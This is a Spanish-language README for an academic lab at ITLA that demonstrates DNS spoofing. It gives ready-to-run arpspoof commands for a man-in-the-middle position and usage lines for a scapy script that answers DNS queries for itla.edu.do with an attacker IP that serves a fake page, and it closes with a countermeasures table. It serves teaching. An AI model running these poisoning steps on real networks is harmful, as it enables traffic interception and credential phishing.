# DNS Spoofing Tool — Matricula: 2023-0316 | ITLA

## Objetivo del Laboratorio
Demostrar **DNS Spoofing / DNS Cache Poisoning** interceptando consultas DNS y respondiendo con IP falsa `20.23.3.16` para que `itla.edu.do` apunte al servidor web del atacante.

---

## Topologia (comun a los 3 ataques)

```
Internet / DNS Real (8.8.8.8)
      |
Router  Fa0/0: 20.23.3.1 (GW)
        Fa0/1 -> SW-L2
      |
SW-L2   Gig0/0: router
        Gig0/1: Kali Linux   20.23.3.16  [ATACANTE + Web falso]
        Gig0/2: PC-Victima   20.23.3.50  [consulta itla.edu.do]
        Gig0/3: PC-Extra     20.23.3.65
```

### Tabla de interfaces

| Dispositivo | Puerto | Conectado a | IP |
|---|---|---|---|
| Router | Fa0/0 | Internet | 20.23.3.1 |
| Router | Fa0/1 | SW-L2 Gig0/0 | — |
| SW-L2 | Gig0/0 | Router Fa0/1 | — |
| SW-L2 | Gig0/1 | Kali eth0 | — |
| SW-L2 | Gig0/2 | PC-Victima | — |
| SW-L2 | Gig0/3 | PC-Extra | — |
| Kali | eth0 | SW-L2 Gig0/1 | 20.23.3.16 |
| PC-Victima | eth0 | SW-L2 Gig0/2 | 20.23.3.50 |

---

## Objetivo del Script

`dns_spoofing.py` hace sniff en eth0 (SW-L2 Gig0/1) interceptando queries UDP/53 de la victima (20.23.3.50) y responde con A falso apuntando a 20.23.3.16. Incluye servidor HTTP embebido que muestra pagina falsa de ITLA.

**Flujo del ataque:**
```
[1] ARP Spoof: Kali envenena ARP de victima y GW -> MITM
[2] Victima consulta: itla.edu.do? (UDP/53)
    -> paquete pasa por Kali (Gig0/1)
    -> Kali responde: itla.edu.do = 20.23.3.16 (FALSA)
[3] Victima abre http://itla.edu.do
    -> resuelve a 20.23.3.16 (Kali)
    -> ve pagina web falsa del atacante
```

---

## Requisitos

```bash
Linux (Kali Linux)
Python 3.8+
pip install scapy
sudo apt install dsniff   # para arpspoof
sudo / root
Kali conectada a SW-L2 Gig0/1
Victima conectada a SW-L2 Gig0/2 (20.23.3.50)
```

---

## Preparacion — ARP Spoof para MITM

```bash
# Habilitar reenvio
echo 1 > /proc/sys/net/ipv4/ip_forward

# Envenenar ARP victima (le dice que GW es Kali)
sudo arpspoof -i eth0 -t 20.23.3.50 20.23.3.1 &

# Envenenar ARP router (le dice que victima es Kali)
sudo arpspoof -i eth0 -t 20.23.3.1 20.23.3.50 &
```

---

## Parametros

| Parametro | Default | Descripcion |
|---|---|---|
| -i | eth0 | Interfaz (SW-L2 Gig0/1) |
| --ip-falsa | 20.23.3.16 | IP falsa a responder |
| -d | itla.edu.do | Dominios a envenenar |
| --web | False | Servidor web falso pto 80 |

---

## Uso

```bash
# Basico con servidor web falso
sudo python3 dns_spoofing.py --web

# Multiples dominios
sudo python3 dns_spoofing.py \
  -d itla.edu.do www.itla.edu.do \
  --ip-falsa 20.23.3.16 --web
```

---

## Configuracion Cisco

### Router
```
hostname ROUTER
interface FastEthernet0/0
 ip address 20.23.3.1 255.255.255.240
 no shutdown
interface FastEthernet0/1
 no ip address
 no shutdown
ip route 0.0.0.0 0.0.0.0 [IP-ISP]
```

### SW-L2
```
hostname SW-L2
interface GigabitEthernet0/0
 switchport mode access
 no shutdown
interface GigabitEthernet0/1
 switchport mode access
 no shutdown
interface GigabitEthernet0/2
 switchport mode access
 no shutdown
interface GigabitEthernet0/3
 switchport mode access
 no shutdown
```

---

## Contramediadas

| Medida | Descripcion | Efectividad |
|---|---|---|
| DNSSEC | Firmas digitales en registros DNS | Alta |
| DoH / DoT | DNS sobre HTTPS o TLS | Alta |
| HTTPS + HSTS | Certificado SSL en servidor web | Alta |
| ARP Inspection | ip arp inspection vlan X | Alta |
| DHCP Snooping | ip dhcp snooping vlan X | Media |
| Static ARP | Entradas ARP estaticas | Media |

---
*Laboratorio academico | ITLA | Matricula: 2023-0316*
